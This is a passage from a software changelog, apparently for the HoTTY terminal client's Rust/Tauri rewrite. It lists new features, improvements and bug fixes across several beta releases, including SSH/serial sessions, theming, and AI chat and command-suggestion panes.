- **Custom Theme Creator** — in-app editor to create user-defined themes by adjusting any CSS variable, with save/edit/delete support from the Appearance tab
- **Help Tooltip component** — contextual help hints embedded next to settings and controls
- **Versioned window title** — main window title now includes the current application version

### Improvements

- **Settings modal** — refined styling across all tabs (Appearance, General, Features, Protocols, AI, About) for visual consistency
- **Settings store** — extended with additional feature toggles and configuration options
- **Sidebar icon spacing** — tightened and balanced icon layout in the app sidebar
- **Removed deprecated ConnectForm** — fully superseded by the Session Dialog; legacy component and styles deleted
- **Expanded test coverage** — added tests for AI chat panels, Ask AI modal, authentication panels, theme utilities, and color/HTML helpers
- **Help modal** — documentation updated to cover the new Custom Theme Creator workflow

### Bug Fixes

- **Modal CSS consistency** — unified padding, border-radius, and animation timing across PasteConfirmationModal, SettingsModal, and HelpModal
- **Pane toolbar consistency** — aligned TextEditorPane and PingMonitorPane toolbars with the standard 36px toolbar spec

## v2.0.0-beta2

Second beta release with AI integration, connection management UI, and enhanced utility panes.

### New Features

- **AI Chat pane** — multi-provider AI chat with streaming responses, personas, and token cost tracking
- **AI providers** — support for Google AI Studio (Gemini), Vertex AI, Anthropic (Claude), and OpenAI (GPT) with provider-specific authentication
- **AI backend services** — Rust-based AI provider infrastructure with SSE streaming support
- **Ask AI modal** — right-click terminal text to query AI with built-in or custom commands
- **AI Settings tab** — configure AI provider, model, personas, Ask AI commands, command execution mode, and monitor buffer limits
- **AI Interactive Mode** — AI can suggest and execute terminal commands with safety classification (safe/destructive/unknown)
- **AI Watch Mode** — monitor terminal output and send captured logs to AI for analysis
- **Host Tree** — connection management UI with folders, drag-and-drop reordering, and host tree export/import
- **Session Dialog** — connection dialog for creating and editing SSH, Telnet, Serial, WSL, Local, and Git Bash sessions with jumpbox and IAP tunnel support
- **Help modal** — comprehensive in-app documentation covering all features, shortcuts, and AI setup guides
- **Confirm modal** — reusable confirmation dialog for destructive actions
- **Command classifier** — categorizes terminal commands as safe, destructive, or unknown for AI auto-execution decisions
- **AI token pricing** — per-model pricing data for cost estimation across all supported providers

### Improvements

- **Text Editor** — major enhancement with find & replace, go-to-line, sub-tabs for multiple files, encoding/line-ending selection, line wrap, return code visualization, and file association support
- **File Explorer** — improved navigation with breadcrumb path, hidden file toggle, drive browsing, and double-click to open in editor
- **Ping Monitor** — enhanced with configurable intervals, log output, and improved layout
- **Log Viewer** — improved with search/filter, regex toggle, and better file browsing
- **Tab Bar** — updated with feature pane tab support and improved drag-and-drop
- **Settings store** — extended with AI settings, enabled features, and additional configuration options
- **Session manager** — updated to support AI chat terminal integration
- **App icons** — refreshed application icons across all platforms (Windows, macOS, iOS, Android)
- **New utility hooks** — useFocusTrap, useModalState, useResize for improved UI interactions
- **ANSI utilities** — added ANSI code processing functions for terminal output handling
- **Color and HTML utilities** — added helper functions for color manipulation and HTML processing

## v2.0.0-beta1

First functional beta of the Rust/Tauri rewrite. This release replaces the Electron-based HoTTY with a Tauri v2 backend for improved memory efficiency and performance.

### New Features

- **Multi-protocol connections** — SSH, Telnet, Serial, WSL, and local shell (cmd, PowerShell, Git Bash)
- **SSH host key verification** — fingerprint display with accept/reject prompt for new and changed host keys
- **SSH private key authentication** — support for key file and passphrase
- **SSH algorithm configuration** — configurable KEX, cipher, MAC, and host key algorithms
- **Serial port support** — configurable baud rate, data bits, parity, stop bits, and flow control
- **WSL distribution selection** — connect to any installed WSL distribution
- **Multi-pane layout** — grid layouts (1x1, 1x2, 2x1, 2x2, 2x3, 3x2) with collapsible sidebars on all four edges
- **Tab bar** — drag-and-drop reordering, session and feature pane tabs
- **Log Viewer pane** — browse and read session log files
- **Text Editor pane** — open, edit, and save files with line ending detection
- **File Explorer pane** — browse directories and drives, open files in the text editor
- **Ping Monitor pane** — monitor multiple targets with configurable intervals and log output
- **Theming** — built-in Dark, Medium, and Light themes with custom theme support
- **Settings modal** — tabbed interface with Appearance, General, Features, Protocols, and About sections
- **Windows DPAPI encryption** — secure credential storage for saved connections
- **Paste confirmation** — modal to review clipboard content before pasting into terminal
- **Session logging** — per-session log output to file
- **Host tree export/import** — encrypted .htree format for connection configuration backup
- **GCE IAP tunnel** — connect to Google Cloud instances via Identity-Aware Proxy
- **Encoding support** — UTF-8, Shift_JIS, and EUC-JP per session
- **Keepalive** — configurable keepalive interval for SSH and Telnet connections
- **System font detection** — list and select installed system fonts for terminal rendering
- **Context menu** — right-click context menu support
- **Debug log management** — view and open debug log folder

### Improvements

- **Rust/Tauri v2 backend** — complete rewrite from Electron for lower memory usage and faster startup
- **Zustand state management** — persistent settings via Zustand with localStorage middleware
- **Typed IPC layer** — all Tauri commands wrapped in tauriService.ts with full TypeScript types
- **Comprehensive test coverage** — Vitest tests for all frontend components, hooks, and services

## v0.1.1

Scaffold-only version bump. No functional changes.

## v0.1.0

- Initial Tauri v2 project scaffold with migration spec.
